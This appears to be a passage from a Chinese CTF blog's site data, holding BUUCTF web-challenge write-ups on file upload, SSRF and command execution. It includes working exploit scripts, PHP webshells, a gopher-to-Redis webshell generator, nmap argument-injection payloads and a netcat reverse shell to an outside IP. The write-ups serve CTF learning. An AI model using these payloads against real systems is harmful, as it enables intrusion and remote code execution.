&#x27;&#x27;&#x27;http://0abaf9de-86a1-4b6e-ab78-f008f607f2d5.node3.buuoj.cn&#x27;&#x27;&#x27;def admin(): files = &#123; &quot;up_file&quot;: (&quot;sess&quot;, BytesIO(b&#x27;\\x08usernames:5:&quot;admin&quot;;&#x27;)) &#125; data = &#123; &quot;direction&quot;: &quot;download&quot;, &quot;attr&quot;: &quot;.&quot;, &#125; res = requests.post(url=url, data=data, files=files) session_id = hashlib.sha256(&#x27;\\x08usernames:5:&quot;admin&quot;;&#x27;.encode()).hexdigest() return session_iddef upload_success(): data = &#123; &quot;direction&quot;: &quot;upload&quot;, &quot;attr&quot;: &quot;success.txt&quot;, &#125; files = &#123; &quot;up_file&quot;: (&quot;test&quot;, BytesIO(b&#x27;good job!&#x27;)) &#125; r = requests.post(url=url, data=data, files=files)upload_success()php_session_id = admin()cookies = &#123; &#x27;PHPSESSID&#x27;: php_session_id&#125;s = requests.get(url)r = requests.get(url=url, cookies=cookies)print(r.text) HarekazeCTF2019 Avatar Uploader 1 考点 finfo_file函数和getimagesize函数的区别 解题 原题是给了源码。 关键代码是在upload.php中 1234567891011121314151617// check file type$finfo = finfo_open(FILEINFO_MIME_TYPE);$type = finfo_file($finfo, $_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;]);finfo_close($finfo);if (!in_array($type, [&#x27;image/png&#x27;])) &#123; error(&#x27;Uploaded file is not PNG format.&#x27;);&#125;// check file width/height$size = getimagesize($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;]);if ($size[0] &gt; 256 || $size[1] &gt; 256) &#123; error(&#x27;Uploaded image is too large.&#x27;);&#125;if ($size[2] !== IMAGETYPE_PNG) &#123; // I hope this never happens... error(&#x27;What happened...? OK, the flag for part 1 is: &lt;code&gt;&#x27; . getenv(&#x27;FLAG1&#x27;) . &#x27;&lt;/code&gt;&#x27;);&#125; 首先我们得了解PHP文件头格式是什么样的 https://blog.csdn.net/u013943420/article/details/76855416 89 50 4E 47 0D 0A 1A 0A 是PNG头部署名域，表示这是一个PNG图片 00 00 00 0D 描述IHDR头部的大小 49 48 44 52 是Chunk Type Code, 这里Chunk Type Code=IHDR 接下来需要了解finfo_file函数和getimagesize函数的区别就在于：FILEINFO 可以识别 png 图片( 十六进制下 )的第一行，而 getimagesize 不可以。 SUCTF 2019 getshell 考点 无数字字母webshell 解题 可用字符：$().;=[]_~ 取反绕过，webshell： 123456789101112131415161718192021222324&lt;?php$_=~(瞎);$__.=$_[[]==[]];$_=~(挟);$__.=$_[[]==[]];$_=~(挟);$__.=$_[[]==[]];$_=~(隙);$__.=$_[[]==[]];$_=~(卸);$__.=$_[[]==[]];$_=~(勋);$__.=$_[[]==[]];$_=~(校);$___.=$_[[]==[]];$_=~(下);$___.=$_[[]==[]];$_=~(纤);$___.=$_[[]==[]];$_=~(嫌);$___.=$_[[]==[]];$___=$$___;$__($___[_]); flag在env环境变量中。 SUCTF 2019 Upload Labs 2 考点 解题 admin.php 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667&lt;?phpinclude &#x27;config.php&#x27;;class Ad&#123; public $cmd; public $clazz; public $func1; public $func2; public $func3; public $instance; public $arg1; public $arg2; public $arg3; function __construct($cmd, $clazz, $func1, $func2, $func3, $arg1, $arg2, $arg3)&#123; $this-&gt;cmd = $cmd; $this-&gt;clazz = $clazz; $this-&gt;func1 = $func1; $this-&gt;func2 = $func2; $this-&gt;func3 = $func3; $this-&gt;arg1 = $arg1; $this-&gt;arg2 = $arg2; $this-&gt;arg3 = $arg3; &#125; function check()&#123; $reflect = new ReflectionClass($this-&gt;clazz); $this-&gt;instance = $reflect-&gt;newInstanceArgs(); $reflectionMethod = new ReflectionMethod($this-&gt;clazz, $this-&gt;func1); $reflectionMethod-&gt;invoke($this-&gt;instance, $this-&gt;arg1); $reflectionMethod = new ReflectionMethod($this-&gt;clazz, $this-&gt;func2); $reflectionMethod-&gt;invoke($this-&gt;instance, $this-&gt;arg2); $reflectionMethod = new ReflectionMethod($this-&gt;clazz, $this-&gt;func3); $reflectionMethod-&gt;invoke($this-&gt;instance, $this-&gt;arg3); &#125; function __destruct()&#123; system($this-&gt;cmd); &#125;&#125;if($_SERVER[&#x27;REMOTE_ADDR&#x27;] == &#x27;127.0.0.1&#x27;)&#123; if(isset($_POST[&#x27;admin&#x27;]))&#123; $cmd = $_POST[&#x27;cmd&#x27;]; $clazz = $_POST[&#x27;clazz&#x27;]; $func1 = $_POST[&#x27;func1&#x27;]; $func2 = $_POST[&#x27;func2&#x27;]; $func3 = $_POST[&#x27;func3&#x27;]; $arg1 = $_POST[&#x27;arg1&#x27;]; $arg2 = $_POST[&#x27;arg2&#x27;]; $arg2 = $_POST[&#x27;arg3&#x27;]; $admin = new Ad($cmd, $clazz, $func1, $func2, $func3, $arg1, $arg2, $arg3); $admin-&gt;check(); &#125;&#125;else &#123; echo &quot;You r not admin!&quot;;&#125; TODO HarekazeCTF2019 Avatar Uploader 2 TODO D3CTF 2019 EzUpload TODO","tags":[{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/tags/CTF/"}],"categories":[{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/categories/CTF/"},{"name":"文件上传","slug":"CTF/文件上传","permalink":"http://ca0y1h.top/categories/CTF/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}]},{"title":"buuctf刷题——SSRF","date":"2020-08-18T09:58:58.000Z","path":"Web_security/ctf_writeup/9.buuctf刷题——SSRF/","text":"De1CTF2019 SSRF Me 考点 Python代码审计 MD5扩展攻击 解题 首先看三个路由： 1234567891011121314151617181920212223# generate Sign For Action Scan.@app.route(&quot;/geneSign&quot;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])def geneSign(): param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;)) action = &quot;scan&quot; return getSign(action, param)@app.route(&#x27;/De1ta&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])def challenge(): action = urllib.unquote(request.cookies.get(&quot;action&quot;)) param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;)) sign = urllib.unquote(request.cookies.get(&quot;sign&quot;)) ip = request.remote_addr if waf(param): return &quot;No Hacker!!!!&quot; task = Task(action, param, sign, ip) return json.dumps(task.Exec())@app.route(&#x27;/&#x27;)def index(): return open(&quot;code.txt&quot;, &quot;r&quot;).read() /：首页，获取源码； /geneSign：从用户获取param参数，再结合预设的action='scan'调用getSign生成签名； /De1ta：从cookie中获取action和sign，再获取param参数，结合当前IP地址构造一个Task类，最后以json的格式返回Exec方法执行结果。 再来看getSign函数： 12def getSign(action, param): return hashlib.md5(secert_key + param + action).hexdigest() 将 secert_key 和 param 和 action 拼在一起，对其md5签名。secert_key是随机生成的16个字节的字符串。 然后来看waf函数： 123456def waf(param): check = param.strip().lower() if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;): return True else: return False 禁止param参数以gopher和file开头。 再来看到 Task 类的 Exec 方法： 123456789101112131415161718192021222324def Exec(self): result = &#123;&#125; result[&#x27;code&#x27;] = 500 if self.checkSign(): if &quot;scan&quot; in self.action: tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, &#x27;w&#x27;) resp = scan(self.param) if resp == &quot;Connection Timeout&quot;: result[&#x27;data&#x27;] = resp else: print resp tmpfile.write(resp) tmpfile.close() result[&#x27;code&#x27;] = 200 if &quot;read&quot; in self.action: f = open(&quot;./%s/result.txt&quot; % self.sandbox, &#x27;r&#x27;) result[&#x27;code&#x27;] = 200 result[&#x27;data&#x27;] = f.read() if result[&#x27;code&#x27;] == 500: result[&#x27;data&#x27;] = &quot;Action Error&quot; else: result[&#x27;code&#x27;] = 500 result[&#x27;msg&#x27;] = &quot;Sign Error&quot; return result 首先验证签名，如果是scan类型就调用 scan 方法来读取内容并写到沙盒下的 result.txt 文件。如果是read类型就读取沙盒中的result.txt内容。 那我们的思路就是： 读取 flag.txt 到 result.txt。 展示 result.txt 的内容。 方法一 预期解法：哈希长度拓展攻击+CVE-2019-9948(urllib) 简单来说MD5扩展长度攻击的原理： https://www.jianshu.com/p/241e772a513f 当已知以下三点 md5(salt+message)的值 message内容 salt+message长度 我们可以在不知道salt的具体内容的情况下，计算出任意的md5(salt+message+padding+append)值 urlopen有两种办法可以读取到本地文件。 直接写文件名，前面啥都别带。 local_file: ,参考 https://bugs.python.org/issue35907 Python脚本exp： 1234567891011121314151617import hashpumpyimport requestsimport urllib.parseurl = &#x27;http://34b95521-f528-44e1-bcf5-b55918e71fc1.node3.buuoj.cn/&#x27;param = &#x27;flag.txt&#x27;r = requests.get(url + &#x27;getSign&#x27;, params=&#123;&#x27;param&#x27;: param&#125;)sign = r.text# generate signhash_sign = hashpumpy.hashpump(sign, param + &#x27;scan&#x27;, &#x27;read&#x27;, 16)r = requests.get(url + &#x27;De1ta&#x27;, params=&#123;&#x27;param&#x27;: param&#125;, cookies=&#123; &#x27;sign&#x27;: hash_sign[0], &#x27;action&#x27;: urllib.parse.quote(hash_sign[1][len(url):])&#125;)print(r.text) 方法二 要想进入对action判断的部分，比如先验证签名： 12345def checkSign(self): if getSign(self.action, self.param) == self.sign: return True else: return False 在checkSign()函数的比较中，左边是getSign(self.action, self.param)，右边是getSign('scan', param)（因为在访问geneSign页面时，是自动传入scan参数）。 如果再写深一点，左边是md5(key + self.param + self.action)，考虑到要读取flag.txt文件，我们可以写成md5(key + 'flag.txt' + self.action)。 为了保证Exec()函数中scan部分和read部分都能被执行，self.action必须有readscan或scanread这样的字符串（注意：源码中用in操作符而不是用==）。 等号右边是md5(key + param + 'scan')，所以可以将等号左边的self.action定为readscan。 这样一来，等号左边为md5(key + 'flag.txt' + 'readscan')，现在就剩下等号右边的param参数没有确定，那么为了验证通过，我们可以将param=flag.txtread传参。 最后也就等价于md5(key + 'flag.txt' + 'readscan') == md5(key + 'flag.txtread' + 'scan') payload1 payload2 GKCTF2020 Ezweb 打开题目查看源代码 添加一下?secret参数，返回了ifconfig命令的结果 应该是SSRF漏洞利用了，先尝试用file协议读文件，发现被ban掉了，用file:/或者file: ///绕过： payload：file: ///var/www/html/index.php 审计一下代码 1234567891011121314151617181920212223&lt;?phpfunction curl($url)&#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_HEADER, 0); echo curl_exec($ch); curl_close($ch);&#125;if(isset($_GET[&#x27;submit&#x27;]))&#123; $url = $_GET[&#x27;url&#x27;]; //echo $url.&quot;\\n&quot;; if(preg_match(&#x27;/file\\:\\/\\/|dict|\\.\\.\\/|127.0.0.1|localhost/is&#x27;, $url,$match)) &#123; //var_dump($match); die(&#x27;别这样&#x27;); &#125; curl($url);&#125;if(isset($_GET[&#x27;secret&#x27;]))&#123; system(&#x27;ifconfig&#x27;);&#125;?&gt; 从源码中可知过滤了file协议、dict协议、127.0.0.1和localhost，但没有过滤http协议和gopher协议。 既然给了内网地址，那么先http协议探测一下内网主机存活，直接上工具Fuzz： 11端口的回显给了一个hint 接着用http协议去Fuzz这个主机的端口 发现了运行着Redis服务，直接用下面这个脚本生成payload： 12345678910111213141516171819202122232425262728293031import urllibprotocol=&quot;gopher://&quot;ip=&quot;173.10.238.11&quot; // 运行有redis的主机ipport=&quot;6379&quot;shell=&quot;\\n\\n&lt;?php system(\\&quot;cat /flag\\&quot;);?&gt;\\n\\n&quot;filename=&quot;shell.php&quot;path=&quot;/var/www/html&quot;passwd=&quot;&quot;cmd=[&quot;flushall&quot;, &quot;set 1 &#123;&#125;&quot;.format(shell.replace(&quot; &quot;,&quot;$&#123;IFS&#125;&quot;)), &quot;config set dir &#123;&#125;&quot;.format(path), &quot;config set dbfilename &#123;&#125;&quot;.format(filename), &quot;save&quot; ]if passwd: cmd.insert(0,&quot;AUTH &#123;&#125;&quot;.format(passwd))payload=protocol+ip+&quot;:&quot;+port+&quot;/_&quot;def redis_format(arr): CRLF=&quot;\\r\\n&quot; redis_arr = arr.split(&quot; &quot;) cmd=&quot;&quot; cmd+=&quot;*&quot;+str(len(redis_arr)) for x in redis_arr: cmd+=CRLF+&quot;$&quot;+str(len((x.replace(&quot;$&#123;IFS&#125;&quot;,&quot; &quot;))))+CRLF+x.replace(&quot;$&#123;IFS&#125;&quot;,&quot; &quot;) cmd+=CRLF return cmdif __name__==&quot;__main__&quot;: for x in cmd: payload += urllib.quote(redis_format(x)) print payload 生成Payload后直接放在输入框中打过去，再输入http://173.10.238.11/shell.php HITCON 2017 SSRFme TODO 网鼎杯 2018 Fakebook TODO 网鼎杯 2020 玄武组 SSRFMe TODO","tags":[{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/tags/CTF/"}],"categories":[{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/categories/CTF/"},{"name":"SSRF","slug":"CTF/SSRF","permalink":"http://ca0y1h.top/categories/CTF/SSRF/"}]},{"title":"buuctf刷题——XSS","date":"2020-08-18T09:58:47.000Z","path":"Web_security/ctf_writeup/8.buuctf刷题——XSS/","text":"[CISCN2019 华东北赛区]Web2 [CISCN2019 华东南赛区]Web9","tags":[{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/tags/CTF/"}],"categories":[{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/categories/CTF/"},{"name":"XSS","slug":"CTF/XSS","permalink":"http://ca0y1h.top/categories/CTF/XSS/"}]},{"title":"buuctf刷题——命令执行","date":"2020-08-18T09:58:31.000Z","path":"Web_security/ctf_writeup/10.buuctf刷题——命令执行/","text":"GXYCTF2019 Ping Ping Ping TODO ACTF2020 新生赛 Exec TODO BUUCTF2018 Online Tool 考点 Nmap参数注入 解题 123456789101112131415161718&lt;?phpif (isset($_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;])) &#123; $_SERVER[&#x27;REMOTE_ADDR&#x27;] = $_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;];&#125;if(!isset($_GET[&#x27;host&#x27;])) &#123; highlight_file(__FILE__);&#125; else &#123; $host = $_GET[&#x27;host&#x27;]; $host = escapeshellarg($host); $host = escapeshellcmd($host); $sandbox = md5(&quot;glzjin&quot;. $_SERVER[&#x27;REMOTE_ADDR&#x27;]); echo &#x27;you are in sandbox &#x27;.$sandbox; @mkdir($sandbox); chdir($sandbox); echo system(&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host);&#125; 参考之前学习PHP代码审计的一篇文章，escapeshellarg函数和escapeshellcmd函数同时使用会导致单引号逃逸。 测试代码： 123456789101112&lt;?php$host = &quot;&#x27; &lt;?php phpinfo();?&gt; -oN shell.php &#x27;&quot;;$host = (string)$host;echo &quot;host:&quot;.$host;echo &quot;&lt;/br&gt;&quot;.&quot;\\n&quot;;$arg = escapeshellarg($host);echo &quot;arg:&quot;.$arg;echo &quot;&lt;/br&gt;&quot;.&quot;\\n&quot;;$cmd = escapeshellcmd($arg);echo &quot;cmd:&quot;.$cmd;echo &quot;&lt;/br&gt;&quot;.&quot;\\n&quot;;?&gt; 对于单个单引号, escapeshellarg()函数转义后,还会在左右各加一个单引号,但escapeshellcmd()函数是直接加一个转义符。 对于成对的单引号, escapeshellcmd()函数默认不转义,但escapeshellarg()函数转义。 host参数先经过escapeshellarg()再经过escapeshellcmd()就会出现问题。 escapeshellarg 先转义了一个单引号,然后引入了一对单引号, escapeshellcmd 不会转义成对的单引号,但是会转义转移符\\，这样, 转移符作用失效,逃逸出来一个单引号。 payload： 1?host&#x3D;&#39; &lt;?php &#96;cat &#x2F;flag&#96;;?&gt; -oN shell.php &#39; 网鼎杯2020 朱雀组 Nmap 考点 Nmap参数注入 解题 和上面一道题比较像了，都是考察Nmap参数注入，但是没有显示源码。 直接用Online Tool的payload进行测试 1&#39; &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php &#39; 提示hacker，Fuzz之后发现应该是过滤PHP关键字，改用短标签和phtml后缀绕过。 1&#39; &lt;?&#x3D;@eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.phtml &#39; 没有提示其他黑名单信息，访问当前目录下的hack.phtml文件存在，用蚁剑连接，拿到flag。 参考文章：https://zhuanlan.zhihu.com/p/145906109 RoarCTF2019 Easy Calc 考点 代码审计 PHP的字符串解析特性Bypass：https://www.freebuf.com/articles/web/213359.html 解题 查看源代码： 123456789101112131415161718&lt;script&gt; //对输入的特殊字符进行URL编码并以GET方式访问请求 $(&#x27;#calc&#x27;).submit(function()&#123; $.ajax(&#123; url:&quot;calc.php?num=&quot;+encodeURIComponent($(&quot;#content&quot;).val()), type:&#x27;GET&#x27;, success:function(data)&#123; $(&quot;#result&quot;).html(`&lt;div class=&quot;alert alert-success&quot;&gt; &lt;strong&gt;答案:&lt;/strong&gt;$&#123;data&#125; &lt;/div&gt;`); &#125;, error:function()&#123; alert(&quot;这啥?算不来!&quot;); &#125; &#125;) return false; &#125;)&lt;/script&gt; 访问calc.php： 123456789101112131415&lt;?phperror_reporting(0);if(!isset($_GET[&#x27;num&#x27;]))&#123; show_source(__FILE__);&#125;else&#123; $str = $_GET[&#x27;num&#x27;]; $blacklist = [&#x27; &#x27;, &#x27;\\t&#x27;, &#x27;\\r&#x27;, &#x27;\\n&#x27;,&#x27;\\&#x27;&#x27;, &#x27;&quot;&#x27;, &#x27;`&#x27;, &#x27;\\[&#x27;, &#x27;\\]&#x27;,&#x27;\\$&#x27;,&#x27;\\\\&#x27;,&#x27;\\^&#x27;]; foreach ($blacklist as $blackitem) &#123; if (preg_match(&#x27;/&#x27; . $blackitem . &#x27;/m&#x27;, $str)) &#123; die(&quot;what are you want to do?&quot;); &#125; &#125; eval(&#x27;echo &#x27;.$str.&#x27;;&#x27;);&#125;?&gt; 第13行eval可以执行PHP代码，测试发现num参数不能输入非数字的值，否则会直接500。 payload： 1calc.php?%20num&#x3D;phpinfo() 例如：/?foo=bar变成Array([foo] =&gt; “bar”)。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。例如，/?%20news[id%00=42会转换为Array([news_id] =&gt; 42)。 代码中过滤了/，用chr绕过： 1http:&#x2F;&#x2F;node3.buuoj.cn:26901&#x2F;calc.php?%20num&#x3D;var_dump(scandir(chr(47))) 读取/f1agg： 1http:&#x2F;&#x2F;node3.buuoj.cn:26901&#x2F;calc.php?%20num&#x3D;readfile(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)) watevrCTF-2019 Supercalc TODO RCTF2019 calcalcalc TODO De1CTF 2019 9calc TODO GXYCTF2019 禁止套娃 考点 Git源码泄露 无参数webshell 解题 dirmap扫描发现有Git目录，用GitHack download下来，审计代码： 123456789101112131415161718192021222324&lt;?phpinclude &quot;flag.php&quot;;echo &quot;flag在哪里呢？&lt;br&gt;&quot;;if(isset($_GET[&#x27;exp&#x27;]))&#123; if (!preg_match(&#x27;/data:\\/\\/|filter:\\/\\/|php:\\/\\/|phar:\\/\\//i&#x27;, $_GET[&#x27;exp&#x27;])) &#123; if(&#x27;;&#x27; === preg_replace(&#x27;/[a-z,_]+\\((?R)?\\)/&#x27;, NULL, $_GET[&#x27;exp&#x27;])) &#123; if (!preg_match(&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;, $_GET[&#x27;exp&#x27;])) &#123; // echo $_GET[&#x27;exp&#x27;]; @eval($_GET[&#x27;exp&#x27;]); &#125; else&#123; die(&quot;还差一点哦！&quot;); &#125; &#125; else&#123; die(&quot;再好好想想！&quot;); &#125; &#125; else&#123; die(&quot;还想读flag，臭弟弟！&quot;); &#125;&#125;// highlight_file(__FILE__);?&gt; 这个正则表达式/[a-z,_]+\\((?R)?\\)/很明显是无参数webshell，直接上payload查看当前路径下的文件： 1?exp&#x3D;var_dump(scandir(pos(localeconv()))); 1readfile(array_rand(array_flip(scandir(current(localeconv()))))); array_rand() 函数返回数组中的随机键名，或者如果您规定函数返回不只一个键名，则返回包含随机键名的数组。 array_flip() array_flip() 函数用于反转/交换数组中所有的键名以及它们关联的键值。 当然，还可以写header字段，然后用get_all_header()函数获得flag.php文件。 BJDCTF 2nd duangShell 考点 swp文件泄露 反弹shell 解题 打开题目提示swp文件泄露，访问.index.php.swp下载文件，vim -r index.php.swp恢复文件。 1234567891011121314151617181920212223242526&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;give me a girl&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;center&gt;&lt;h1&gt;珍爱网&lt;/h1&gt;&lt;/center&gt;&lt;/body&gt;&lt;/html&gt;&lt;?phperror_reporting(0);echo &quot;how can i give you source code? .swp?!&quot;.&quot;&lt;br&gt;&quot;;if (!isset($_POST[&#x27;girl_friend&#x27;])) &#123; die(&quot;where is P3rh4ps&#x27;s girl friend ???&quot;);&#125; else &#123; $girl = $_POST[&#x27;girl_friend&#x27;]; if (preg_match(&#x27;/\\&gt;|\\\\\\/&#x27;, $girl)) &#123; die(&#x27;just girl&#x27;); &#125; else if (preg_match(&#x27;/ls|phpinfo|cat|\\%|\\^|\\~|base64|xxd|echo|\\$/i&#x27;, $girl)) &#123; echo &quot;&lt;img src=&#x27;img/p3_need_beautiful_gf.png&#x27;&gt; &lt;!-- He is p3 --&gt;&quot;; &#125; else &#123; //duangShell~~~~ exec($girl); &#125;&#125; 观察源代码之后发现是绕过过滤之后命令执行的题目。 因为过滤了$符号，所以不能采用这种黑名单拼接的方式绕过 1a&#x3D;ca;b&#x3D;t;c&#x3D;flag;&#96;&#96;$ab&#96; &#96;$c 禁用了base64之后不能使用base64编码绕过 1echo &quot;Y2F0IGZsYWc&#x3D;&quot; | base64 -d 而且exec()函数是没有回显的，又想了一些奇怪的姿势，着实不行，看师傅们的博客吧。 这道题用到的是反弹shell。 https://xz.aliyun.com/t/2548 https://xz.aliyun.com/t/2549 1girl_friend&#x3D;nc 47.97.199.89 8888 -e &#x2F;bin&#x2F;bash 本机获得shell后，查找flag 1find &#x2F; -name *flag* 极客大挑战2019 RCE ME 考点 无数字字母的webshell disable_function绕过 解题 审计代码 1234567891011121314151617&lt;?phperror_reporting(0);if(isset($_GET[&#x27;code&#x27;]))&#123; $code=$_GET[&#x27;code&#x27;]; if(strlen($code)&gt;40)&#123; die(&quot;This is too Long.&quot;); &#125; if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code))&#123; die(&quot;NO.&quot;); &#125; @eval($code);&#125;else&#123; highlight_file(__FILE__);&#125;// ?&gt; 这个知识点都要考烂了，先用phpinfo验证一下，直接给payload： 1?code&#x3D;$&#123;%86%86%86%86^%d9%c1%c3%d2&#125;&#123;%86&#125;();&amp;%86&#x3D;phpinfo 先构造一个shell，用蚁剑连接 1?code&#x3D;$&#123;%86%86%86%86^%d9%c1%c3%d2&#125;[_]($&#123;%86%86%86%86^%d9%c1%c3%d2&#125;[__]);&amp;_&#x3D;assert&amp;__&#x3D;eval($_POST[%27a%27]) PHP7.0 还可以使用assert来执行php语句，PHP7.1之后就不行了。 然后再加载绕过disable_function的插件，运行readflag即可。 WUSTCTF2020 朴实无华 考点 intval函数绕过 md5弱类型 Linux命令空格和cat绕过 解题 根据hint访问fl4g.php 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?phpheader(&#x27;Content-type:text/html;charset=utf-8&#x27;);error_reporting(0);highlight_file(__file__);//level 1if (isset($_GET[&#x27;num&#x27;]))&#123; $num = $_GET[&#x27;num&#x27;]; if(intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021)&#123; echo &quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&quot;; &#125;else&#123; die(&quot;金钱解决不了穷人的本质问题&quot;); &#125;&#125;else&#123; die(&quot;去非洲吧&quot;);&#125;//level 2if (isset($_GET[&#x27;md5&#x27;]))&#123; $md5=$_GET[&#x27;md5&#x27;]; if ($md5==md5($md5)) echo &quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;&quot;; else die(&quot;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&quot;);&#125;else&#123; die(&quot;去非洲吧&quot;);&#125;//get flagif (isset($_GET[&#x27;get_flag&#x27;]))&#123; $get_flag = $_GET[&#x27;get_flag&#x27;]; if(!strstr($get_flag,&quot; &quot;))&#123; $get_flag = str_ireplace(&quot;cat&quot;, &quot;wctf2020&quot;, $get_flag); echo &quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;&quot;; system($get_flag); &#125;else&#123; die(&quot;快到非洲了&quot;); &#125;&#125;else&#123; die(&quot;去非洲吧&quot;);&#125;?&gt; 套娃题，一层一层的来看。 第一层是用科学计数法绕过intval函数的if判断，给一个demo 123456789&lt;?php$a=&quot;3e4&quot;;echo intval($a);// 3$b=&quot;3e4&quot;;echo intval($b+1);?&gt;// 30001 这是因为进行+1操作的时候会先将$a的科学计数法解析然后再加1。 以下只适合php7.0及以下版本 第二层是md5的弱比较 12340e215962017md5值：0e2912424769407768451503085778240e2159620md5值：0e2159620 第三层是绕过空格和cat命令，空格的代替方式$&#123;IFS&#125;、$IFS，cat的代替方式ca\\t、sort、more等等。 CISCN2019 华北赛区 love math 考点 代码审计 解题 12345678910111213141516171819202122232425262728&lt;?phperror_reporting(0);//听说你很喜欢数学，不知道你是否爱它胜过爱flagif(!isset($_GET[&#x27;c&#x27;]))&#123; show_source(__FILE__);&#125;else&#123; //例子 c=20-1 $content = $_GET[&#x27;c&#x27;]; if (strlen($content) &gt;= 80) &#123; die(&quot;太长了不会算&quot;); &#125; $blacklist = [&#x27; &#x27;, &#x27;\\t&#x27;, &#x27;\\r&#x27;, &#x27;\\n&#x27;,&#x27;\\&#x27;&#x27;, &#x27;&quot;&#x27;, &#x27;`&#x27;, &#x27;\\[&#x27;, &#x27;\\]&#x27;]; foreach ($blacklist as $blackitem) &#123; if (preg_match(&#x27;/&#x27; . $blackitem . &#x27;/m&#x27;, $content)) &#123; die(&quot;请不要输入奇奇怪怪的字符&quot;); &#125; &#125; //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp $whitelist = [&#x27;abs&#x27;, &#x27;acos&#x27;, &#x27;acosh&#x27;, &#x27;asin&#x27;, &#x27;asinh&#x27;, &#x27;atan2&#x27;, &#x27;atan&#x27;, &#x27;atanh&#x27;, &#x27;base_convert&#x27;, &#x27;bindec&#x27;, &#x27;ceil&#x27;, &#x27;cos&#x27;, &#x27;cosh&#x27;, &#x27;decbin&#x27;, &#x27;dechex&#x27;, &#x27;decoct&#x27;, &#x27;deg2rad&#x27;, &#x27;exp&#x27;, &#x27;expm1&#x27;, &#x27;floor&#x27;, &#x27;fmod&#x27;, &#x27;getrandmax&#x27;, &#x27;hexdec&#x27;, &#x27;hypot&#x27;, &#x27;is_finite&#x27;, &#x27;is_infinite&#x27;, &#x27;is_nan&#x27;, &#x27;lcg_value&#x27;, &#x27;log10&#x27;, &#x27;log1p&#x27;, &#x27;log&#x27;, &#x27;max&#x27;, &#x27;min&#x27;, &#x27;mt_getrandmax&#x27;, &#x27;mt_rand&#x27;, &#x27;mt_srand&#x27;, &#x27;octdec&#x27;, &#x27;pi&#x27;, &#x27;pow&#x27;, &#x27;rad2deg&#x27;, &#x27;rand&#x27;, &#x27;round&#x27;, &#x27;sin&#x27;, &#x27;sinh&#x27;, &#x27;sqrt&#x27;, &#x27;srand&#x27;, &#x27;tan&#x27;, &#x27;tanh&#x27;]; preg_match_all(&#x27;/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/&#x27;, $content, $used_funcs); foreach ($used_funcs[0] as $func) &#123; if (!in_array($func, $whitelist)) &#123; die(&quot;请不要输入奇奇怪怪的函数&quot;); &#125; &#125; //帮你算出答案 eval(&#x27;echo &#x27;.$content.&#x27;;&#x27;);&#125; 审计 可以看到代码对于我们的传参进行了如下限制： 长度限制&lt;80 黑名单特殊字符限制 正则匹配字符通过白名单验证，比如 12345abs(1)能过1abs()能过absa()不能过abs(a)不能过abs()a不能过 其中正则匹配字符： 1preg_match_all(&#x27;/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/&#x27;, $content, $used_funcs); 是将$content变量中以字母开头的字符串组成数组储存在$used_funcs变量中。 查看$whitelist我们可以看到两个进制转换函数： base_convert()：在任意进制之间转换数字（2 - 32 进制)。 dechex()：把十进制数转换为十六进制数。 我们知道32进制包括0-9a-z等字符。所以我们可以通过base_convert()函数利用进制转换构造特定的字符串。 构造payload 方法一 由于长度的限制，肯定是要构造&#123;$_GET&#125;&#123;xx&#125;(&#123;$_GET&#125;&#123;yy&#125;)来执行shell。 hex2bin() 函数：把十六进制值的字符串转换为 ASCII 字符。 首先把$_GET转换为10进制表示： 12&gt;&gt;&gt; int(binascii.b2a_hex(b&#x27;_GET&#x27;), 16)1598506324 再利用base_convert函数构造hex2bin函数： 12php &gt; var_dump(base_convert(37907361743, 10, 36));string(7) &quot;hex2bin&quot; 最后，我们就利用dechex函数把10进制表示的$_GET转换为16进制表示，然后传入hex2bin()函数。 所以最后的payload： 1$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;pi&#125;(($$pi)&#123;abs&#125;)&amp;pi&#x3D;system&amp;abs&#x3D;cat &#x2F;flag 另外一种形式： 